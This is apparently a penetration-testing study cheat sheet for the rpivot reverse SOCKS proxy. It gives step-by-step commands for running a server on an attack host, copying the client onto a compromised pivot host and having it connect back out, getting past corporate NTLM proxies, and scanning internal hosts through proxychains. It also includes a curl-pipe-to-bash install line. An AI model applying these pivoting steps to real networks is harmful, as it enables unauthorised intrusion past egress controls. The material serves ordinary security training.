# Rpivot Quick Reference

## What is Rpivot?

**Rpivot** = Reverse SOCKS proxy (Python) for pivoting when direct connections blocked

**Key Features**:
- ✅ Reverse connection (client → server)
- ✅ Bypasses egress filtering
- ✅ NTLM proxy authentication support
- ⚠️ Requires Python 2.7

## Installation

### Quick Install
```bash
# Clone rpivot
git clone https://github.com/klsecservices/rpivot.git
cd rpivot

# Install Python 2.7
sudo apt-get install python2.7
```

### Alternative (pyenv)
```bash
curl https://pyenv.run | bash
echo 'export PYENV_ROOT="$HOME/.pyenv"' >> ~/.bashrc
echo 'export PATH="$PYENV_ROOT/bin:$PATH"' >> ~/.bashrc
source ~/.bashrc
pyenv install 2.7
pyenv shell 2.7
```

## Basic Usage

### Step 1: Start Server (Attack Host)
```bash
# Listen for client connections
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```

**Options**:
- `--proxy-port 9050` = SOCKS proxy port (for proxychains)
- `--server-port 9999` = Port for client to connect
- `--server-ip 0.0.0.0` = Listen on all interfaces

### Step 2: Transfer to Target
```bash
scp -r rpivot ubuntu@TARGET:/home/ubuntu/
```

### Step 3: Run Client (Target)
```bash
# On pivot host
python2.7 client.py --server-ip 10.10.14.18 --server-port 9999
```

### Step 4: Configure Proxychains
```bash
# Edit /etc/proxychains.conf
echo "socks4 127.0.0.1 9050" >> /etc/proxychains.conf
```

### Step 5: Use Proxychains
```bash
proxychains firefox 172.16.5.135:80
proxychains nmap -sT 172.16.5.135
```

## Network Flow
```
Internal Web Server (172.16.5.135)
    ↑
Pivot Target (client.py connects out)
    ↓ Reverse connection to
Attack Host (server.py listening)
    ↓ Provides SOCKS proxy
    127.0.0.1:9050
    ↓
Proxychains → Access internal resources
```

## NTLM Proxy Authentication

### When Corporate HTTP Proxy Blocks
```bash
python2.7 client.py \
  --server-ip ATTACK_HOST \
  --server-port 8080 \
  --ntlm-proxy-ip PROXY_IP \
  --ntlm-proxy-port 8081 \
  --domain DOMAIN \
  --username USERNAME \
  --password PASSWORD
```

**Use Case**: When target requires NTLM auth to reach external servers

## Complete Workflow
```bash
# ATTACK HOST (10.10.14.18)
# Terminal 1: Start rpivot server
cd rpivot
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0

# Terminal 2: Transfer to target
scp -r rpivot ubuntu@10.129.202.64:/home/ubuntu/

# PIVOT TARGET (10.129.202.64)
# Run client
cd rpivot
python2.7 client.py --server-ip 10.10.14.18 --server-port 9999

# ATTACK HOST
# Terminal 3: Configure proxychains
echo "socks4 127.0.0.1 9050" >> /etc/proxychains.conf

# Terminal 4: Access internal web server
proxychains firefox 172.16.5.135:80
```

## Common Commands

| Task | Command |
|------|---------|
| **Start server** | `python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0` |
| **Run client** | `python2.7 client.py --server-ip ATTACK_IP --server-port 9999` |
| **Transfer** | `scp -r rpivot user@target:/path/` |
| **Use proxy** | `proxychains COMMAND` |

## Rpivot vs SSH/Sshuttle

| Feature | Rpivot | SSH | Sshuttle |
|---------|--------|-----|----------|
| **Direction** | Reverse | Forward | Forward |
| **Protocol** | Python/SOCKS | SSH | SSH |
| **NTLM Auth** | ✅ Yes | ❌ No | ❌ No |
| **Python 2.7** | ⚠️ Required | ❌ N/A | ❌ N/A |
| **Ease** | 🟡 Medium | 🟢 Easy | 🟢 Easy |

## Advantages

✅ **Reverse connection** (bypasses egress)
✅ **NTLM proxy support**
✅ **No SSH required**

## Disadvantages

❌ Requires Python 2.7 (outdated)
❌ More complex than SSH
❌ Must transfer files to target

## Troubleshooting

### Issue 1: Python 2.7 Not Found
```bash
# Install via apt
sudo apt install python2.7

# Or use pyenv
pyenv install 2.7
pyenv shell 2.7
```

### Issue 2: Client Won't Connect
```bash
# Check server running
ps aux | grep server.py
netstat -tlnp | grep 9999

# Check firewall
sudo iptables -L

# Use verbose mode
python2.7 client.py --server-ip IP --server-port 9999 -v
```

### Issue 3: Proxychains Not Working
```bash
# Verify proxychains config
tail /etc/proxychains.conf
# Should have: socks4 127.0.0.1 9050

# Check server listening
netstat -tlnp | grep 9050
```

## Key Points

🔴 **Remember**:
- Server on attack host
- Client on pivot target
- Client connects TO server (reverse)
- Requires Python 2.7
- Use proxychains to access resources

🎯 **Best For**:
- Bypassing egress filtering
- NTLM proxy environments
- When SSH not available

## Quick Commands
```bash
# Install
git clone https://github.com/klsecservices/rpivot.git
sudo apt install python2.7

# Server (attack host)
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0

# Transfer
scp -r rpivot user@target:/home/user/

# Client (pivot target)
python2.7 client.py --server-ip ATTACK_IP --server-port 9999

# Use
proxychains firefox 172.16.5.135
